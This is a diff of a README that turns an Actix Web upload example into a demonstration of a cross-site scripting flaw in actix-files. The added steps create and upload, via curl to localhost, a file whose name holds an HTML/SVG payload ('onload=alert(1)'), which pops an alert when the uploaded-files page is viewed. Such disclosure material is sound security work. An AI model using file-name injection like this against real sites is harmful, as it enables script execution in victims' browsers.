@@ -1,11 +1,14 @@
-# Actix Web File Upload with Async/Await
+# actix-files vuln example
 
 ### Run
 
-``` open web browser to localhost:3000 and upload file(s) ```
+Start server and upload a file
+```
+$ echo foo >'">foo<svg onload=alert(1)>'
+$ curl -F file=@'">foo<svg onload=alert(1)>' http://localhost:3001/
+```
+Open web browser to localhost:3001/uploaded
 
 ### Result
 
-``` file(s) will show up in ./tmp in the same directory as the running process ```
-
-Note: this is a naive implementation and will panic on any error
+An alert dialog box should appear
